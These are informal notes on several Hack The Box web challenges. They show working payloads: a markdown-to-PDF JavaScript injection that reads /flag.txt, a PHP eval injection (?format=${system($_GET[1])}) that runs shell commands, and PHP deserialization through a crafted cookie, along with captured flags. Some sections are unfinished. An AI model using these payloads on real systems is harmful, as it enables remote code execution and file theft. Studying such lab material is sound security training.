# blinker fluids htb


examining the code we can see in the docker file

```
# Add flag
COPY flag.txt /flag.txt
```
and we see a fake flag for testing as well.

while creating pdf we see

```
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 

```
https://heinandre.no/htb-cyber-apocalypse-2022/web/blinker-fluids/

first we look at the databases and imports.
we see any templating engine then we can try and inject.

while trying iframe injection I was able to inject an iframe but no flag text file still.


```
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt')}"; display: block }`,
}
---

```
HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}

# templated htb

when we go to http://159.65.58.189:31882/

we can see that site is still under construction and uses jinja templates

so straight away template injection comes to mind.

but need to run dirbuster to get to any good sites.

https://ireadyoulearn.info/2021/06/19/server-side-template-injection-hack-the-box-walkthrough/

trying with /config

```

# phonebook

after doing passwird bruteforcing it worked.

# gunship

while looking at the code I could see the line 

`pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })`

maybe if instead of 'guest we can put something else?

AST injection was the original hint in one of the comments in the machine

looking at AST injection

# sanitize

sql injection in 
HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}

# Lovetok

the time changes everytime hte page is refreshed

we see inside entrypoint.sh

`FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
`
will give out random numbers

```
~/Downloads/web_lovetok âŒš 13:03:55
$ cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1

Sz0Ir

```

The website handles all request path

function for time

```
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

Eval is the vulnerability, however you see the addslashes. looking at the net for addslashes we found.

?format=${phpinfo()} if we add to the url it works

you can enumerate th edirectory by : http://206.189.20.127:31160/?format=${system($_GET[1])}&1=ls+/

th flag will be at : http://157.245.33.77:32397/?format=${system($_GET[1])}&1=cat+flagwGg4C

not getting flags anymore though

# TOXIC

The entire structure is similar to lovetok.

The page itself is static.

in index.php we find

```php
<?php

spl_autoload_register(function ($name){

    if (preg_match('/Model$/', $name))

    {

        $name = "models/${name}";

    }

    include_once "${name}.php";

});



if (empty($_COOKIE['PHPSESSID']))

{

    $page = new PageModel;

    $page->file = '/www/index.html';



    setcookie(

        'PHPSESSID', 

        base64_encode(serialize($page)), 

        time()+60*60*24, 

        '/'

    );

} 



$cookie = base64_decode($_COOKIE['PHPSESSID']);

unserialize($cookie);


```

and in page model

```php
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```

the page handle anything

I can see it makes a phpssied cookie though

can we make it load malicous cookie?

```
PHPSESSID:"Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9"
```

after decoding it we found

O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}

now we can put in any page inside it
